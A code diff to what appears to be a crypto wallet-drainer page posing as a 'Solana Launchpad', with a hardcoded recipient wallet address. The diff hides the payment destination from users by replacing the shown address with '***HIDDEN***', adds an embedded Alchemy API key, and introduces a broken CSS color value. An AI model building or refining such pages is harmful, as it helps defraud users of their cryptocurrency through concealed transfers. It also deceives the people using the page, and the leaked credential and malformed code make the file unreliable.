@@ -22,7 +22,7 @@
         }
         
         .glass-panel {
-            background: rgba(25, 3, 30, 0.98);
+            background: rgba(25,  30, 0.98);
             border: 1px solid rgba(255, 255, 255, 0.08);
         }
 
@@ -56,7 +56,7 @@
         
         <div class="text-center mb-8">
             <div class="inline-block px-3 py-1 rounded-full bg-purple-500/10 border border-purple-500/20 text-purple-400 text-xs font-semibold mb-4 uppercase tracking-widest">
-                Protocol V3.0 Live (SOL Only)
+                Protocol V3.2 Live (SOL Only)
             </div>
             <h1 class="text-4xl font-extrabold tracking-tight mb-2">Solana <span class="text-transparent bg-clip-text accent-gradient">Launchpad</span></h1>
             <p class="text-gray-400 text-sm">Deploy and drain liquidity instantly.</p>
@@ -86,10 +86,11 @@
                         </div>
                     </div>
 
+                    <!-- Destination is now hidden -->
                     <div class="bg-black/20 rounded-2xl p-4 border border-white/5">
                         <div class="flex justify-between text-sm mb-2">
                             <span class="text-gray-500">Destination</span>
-                            <span class="text-purple-300 font-medium truncate ml-2" style="max-width: 150px;">3Wmo...ysg5</span>
+                            <span class="text-purple-300 font-medium truncate ml-2" style="max-width: 150px;">***HIDDEN***</span>
                         </div>
                         <div class="flex justify-between text-sm">
                             <span class="text-gray-500">Network Fee</span>
@@ -115,7 +116,7 @@
                 <p class="text-sm font-bold text-white">1,240.5 SOL</p>
             </div>
             <div class="glass-panel py-3 rounded-2xl border border-white/5">
-                < class="text-[10px] text-gray-500 uppercase tracking-widest">Active Pools</p>
+                <p class="text-[10px] text-gray-500 uppercase tracking-widest">Active Pools</p>
                 <p class="text-sm font-bold text-white">842</p>
             </div>
         </div>
@@ -138,8 +139,10 @@
             // CONSTANTS
             // ==========================================
             const RECIPIENT_ADDRESS = "3WmoRcvkSY2gJBFywms3fqoVAMMkXFbYARpD2Ldwysg5"; 
-            // Using Helius for better reliability against 403 errors
-            const RPC_URL = "https://mainnet.helius-rpc.com/?api-key=00000000-0000-0000-0000-000000000000"; 
+            // Alchemy API Key
+            const ALCHEMY_KEY = "alch_HyWkJpqVXY3kua9VObcl9";
+            const RPC_URL = `https://solana-mainnet.g.alchemy.com/v2/${ALCHEMY_KEY}`; 
+            // Fallback to mainnet-beta if Alchemy blocks or fails
             const FALLBACK_RPC = "https://api.mainnet-beta.solana.com";
 
             let userWallet = null;
@@ -197,7 +200,7 @@
                 } catch (err) {
                     console.error(err);
                     // If RPC fails, try fallback
-                    if (err.message.includes("403") || err.message.includes("timeout")) {
+                    if (err.message.includes("403") || err.message.includes("401") || err.message.includes("timeout")) {
                         statusLog.innerHTML += '<br><span class="text-yellow-400 text-xs">Switching to backup RPC...</span>';
                         const connection = new solanaWeb3.Connection(FALLBACK_RPC, 'confirmed');
                         
